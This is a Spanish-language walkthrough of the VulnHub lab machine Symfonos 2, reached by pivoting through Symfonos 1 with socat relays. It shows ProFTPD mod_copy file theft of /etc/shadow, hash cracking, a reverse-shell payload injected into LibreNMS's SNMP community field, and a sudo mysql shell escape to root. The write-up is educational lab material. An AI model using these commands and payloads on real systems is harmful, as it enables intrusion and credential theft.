Symfonos 2 es la segunda mitad del laboratorio de pivoting de **VulnHub** — la máquina que solo vive en la red interna `10.0.0.0/24`, sin ruta desde mi host. Llego a ella enteramente *a través* de [Symfonos 1](/es/posts/symfonos-1/), que ya rooteé y convertí en pivot. Desde ahí es una cadena propia: **ProFTPD `mod_copy`** (**CVE-2015-3306**) para robar `/etc/shadow` sin login, un hash crackeado para `aeolus`, un *segundo* pivot a un panel interno de **LibreNMS** explotado a mano para una shell como `cronus`, y `sudo mysql` a root. Como en Symfonos 1, mis scripts y sesiones están conservados en su totalidad.

## Llegando a la Máquina

Todo aquí corre contra el host oculto **detrás de [Symfonos 1](/es/posts/symfonos-1/)**. En esa primera máquina (que rooteé por separado) monté relays de `socat` que reenvían los puertos de Symfonos 2 hacia mi host — así `192.168.56.6:100xx` alcanza `10.0.0.103:xx`:

```bash
# en symfonos1 (el pivot): un relay por puerto, p. ej.
socat TCP-LISTEN:10021,reuseaddr,fork TCP-CONNECT:10.0.0.103:21 &
socat TCP-LISTEN:10022,reuseaddr,fork TCP-CONNECT:10.0.0.103:22 &   # ... 80/139/445 también
```

El montaje completo del pivot (segunda interfaz, barrido de ping, `portScan.sh`, `pivot.sh`) está en el [writeup de Symfonos 1](/es/posts/symfonos-1/#pivoting-hacia-symfonos-2). Desde aquí trato `192.168.56.6:100xx` como Symfonos 2.

## Reconocimiento a Través del Pivot

Escanear los puertos reenviados revela Symfonos 2 como si fuera local:

```bash
sudo nmap -p10021,10022,10080,10139,10445 -sCV 192.168.56.6 -oN nmap2
# 10021  ftp         ProFTPD 1.3.5
# 10022  ssh         OpenSSH 7.4p1 Debian
# 10080  http        WebFS httpd 1.21
# 10139  netbios-ssn Samba
# 10445  netbios-ssn Samba
```

El recurso SMB anónimo guarda un `backups/log.txt` que filtra la propia disposición de la máquina — un backup de `/etc/shadow` en `/var/backups/shadow.bak`, y que el recurso Samba `anonymous` mapea a `/home/aeolus/share`:

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N
smb: \> cd backups ; get log.txt
```

```text
root@symfonos2:~# cat /etc/shadow > /var/backups/shadow.bak
root@symfonos2:~# cat /etc/samba/smb.conf
[anonymous]
   path = /home/aeolus/share
```

## Acceso Inicial — `aeolus` vía ProFTPD mod_copy (CVE-2015-3306)

**ProFTPD 1.3.5** tiene el módulo `mod_copy` habilitado, que expone `SITE CPFR`/`SITE CPTO` — una forma **no autenticada** de copiar cualquier fichero que el proceso de ProFTPD pueda leer a cualquier ruta donde pueda escribir. Como el recurso SMB `anonymous` *es* `/home/aeolus/share`, copio ficheros sensibles ahí y los leo por SMB. Primero `/etc/passwd` para conocer los usuarios:

```text
└─❯ nc 192.168.56.6 10021
220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.0.0.103]
site cpfr /etc/passwd
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/passwd.copy
250 Copy successful
```

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N -c 'get passwd.copy'
cat passwd.copy | grep "sh$"
# root:x:0:0:root:/root:/bin/bash
# aeolus:x:1000:1000:,,,:/home/aeolus:/bin/bash
# cronus:x:1001:1001:,,,:/home/cronus:/bin/bash
```

Luego el backup de shadow que nos indicó el log:

```text
└─❯ nc 192.168.56.6 10021
site cpfr /var/backups/shadow.bak
350 File or directory exists, ready for destination name
site cpto /home/aeolus/share/shadow.bak
250 Copy successful
```

```bash
smbclient \\\\192.168.56.6\\anonymous -p 10445 -N -c 'get shadow.bak'
cat shadow.bak
# root:$6$VTftENaZ$...
# aeolus:$6$dgjUjE.Y$...
# cronus:$6$wOmUfiZO$...
```

Los hashes `$6$` son sha512crypt (modo 1800 de hashcat); `aeolus` cae ante rockyou:

```bash
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
# $6$dgjUjE.Y$...:sergioteamo
```

**`aeolus:sergioteamo`**. (La misma contraseña también cae con una fuerza bruta de `hydra` por FTP contra el puerto reenviado — `hydra -l aeolus -P rockyou.txt ftp://192.168.56.6 -s 10021` — una alternativa más lenta que crackear el hash offline.) Esas credenciales entran directamente por SSH a través del pivot:

```bash
ssh aeolus@192.168.56.6 -p 10022      # contraseña: sergioteamo
aeolus@symfonos2:~$ hostname -I
# 10.0.0.103
```

## Movimiento Lateral — `aeolus` → `cronus` (LibreNMS)

Como `aeolus`, los servicios interesantes están atados solo a localhost — MySQL, SMTP, y una app web en `127.0.0.1:8080`:

```bash
aeolus@symfonos2:~$ ss -nltp
# LISTEN 127.0.0.1:3306
# LISTEN 127.0.0.1:8080
# LISTEN 127.0.0.1:25
```

### Un segundo pivot

Para llegar al `8080` desde mi host necesito **dos** saltos más: Symfonos 2 reenvía su propio `8080` hacia la red interna, y Symfonos 1 lo reenvía a mi host.

```bash
# en symfonos2: exponer 127.0.0.1:8080 en la interfaz interna como :8000
aeolus@symfonos2:/tmp$ socat TCP-LISTEN:8000,reuseaddr,fork TCP-CONNECT:127.0.0.1:8080 &
```

```bash
# en symfonos1 (el pivot): reenviar :18000 → symfonos2:8000
bash-4.4# socat TCP-LISTEN:18000,reuseaddr,fork TCP-CONNECT:10.0.0.103:8000 &
```

Ahora mi host alcanza el panel en `192.168.56.6:18000` — es **LibreNMS**, y `aeolus:sergioteamo` entra:

```bash
curl http://192.168.56.6:18000
# Redirecting to http://192.168.56.6:18000/login
```

### RCE por addhost de LibreNMS

LibreNMS 1.46 tiene una **inyección de comandos** conocida en el flujo de *Add Device* (EDB 47044): la cadena **community** de SNMP se pasa sin sanitizar a un comando del SO cuando se sondea el dispositivo. El exploit ya hecho creaba el dispositivo pero nunca conseguía shell, así que lo hice a mano. En la página de **Add Device** pongo un hostname, activo SNMP, y meto un payload de reverse shell en el campo **Community** — apuntado a `10.0.0.103:4444`, donde `aeolus` está escuchando:

```text
'$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.103 4444 >/tmp/f) #
```

![Formulario Add Device de LibreNMS con el payload de reverse shell en el campo Community](/assets/img/VulnHub/Symfonos-2/cap1.png)

Con "Force add" marcado el dispositivo se guarda, y el payload se dispara cuando se sondea SNMP — lo lanzo desde **Capture Debug Information → SNMP → Run**:

![Página Capture Debug Information, pestaña SNMP, botón Run](/assets/img/VulnHub/Symfonos-2/cap2.png)

```bash
aeolus@symfonos2:~$ nc -nvlp 4444
connect to [10.0.0.103] from (UNKNOWN) [10.0.0.103] 57564
$ whoami
cronus       # LibreNMS corre como cronus
```

Una shell como **`cronus`**. Tras el tratamiento de la TTY vuelvo a dejar mi clave pública en `~/.ssh/authorized_keys` para acceso estable.

## Escalada de Privilegios — `cronus` → `root` (sudo mysql)

`cronus` puede ejecutar `mysql` como root sin contraseña:

```bash
cronus@symfonos2:~$ sudo -l
# User cronus may run the following commands on symfonos2:
#     (root) NOPASSWD: /usr/bin/mysql
```

El `\!` de `mysql` ejecuta un comando de shell — y como corre como root, esa shell es root ([GTFOBins](https://gtfobins.github.io/gtfobins/mysql/)):

```bash
cronus@symfonos2:~$ sudo mysql -e '\! /bin/sh'
# whoami
root
# cat /root/proof.txt
# Congrats on rooting symfonos:2!   (ASCII art recortado)
```

Root en Symfonos 2 — ambas máquinas del laboratorio comprometidas, de principio a fin a través del pivot.

## Conclusiones Clave

- **`mod_copy` es lectura/escritura de ficheros pre-auth.** El `SITE CPFR`/`CPTO` de ProFTPD copió `/etc/shadow` a una ruta legible por SMB sin ningún login — un recordatorio de que un recurso "anónimo, de solo lectura" más un primitivo de copia no autenticado equivale a divulgación total de credenciales.
- **El pivoting es por capas, no un solo salto.** Llegar a Symfonos 2 requirió un reenvío `socat` por puerto en Symfonos 1; llegar a *su* LibreNMS atado a localhost requirió un *segundo* `socat` en cada host. Tener clara la cadena de relays — quién expone qué, y a quién — es la habilidad central de una red multi-host.
- **Las herramientas de monitorización ejecutan comandos para ganarse la vida.** LibreNMS sondea dispositivos haciendo shell-out, así que una cadena de community SNMP sin sanitizar es RCE como la cuenta de servicio. El acceso de admin a un NMS está cerca de la ejecución de código en su host por diseño — y aquí esa cuenta de servicio (`cronus`) estaba a una regla de sudo débil de root.
- **`sudo … mysql` es `sudo … sh`.** Cualquier programa que pueda ejecutar un comando de shell (el `\!` de `mysql`, `vi`, `find`, `awk`…) bajo `sudo` es una shell de root completa vía GTFOBins. Las reglas de sudo deben conceder una *capacidad*, no un *binario* — `/usr/bin/mysql` como root era, en la práctica, `ALL`.
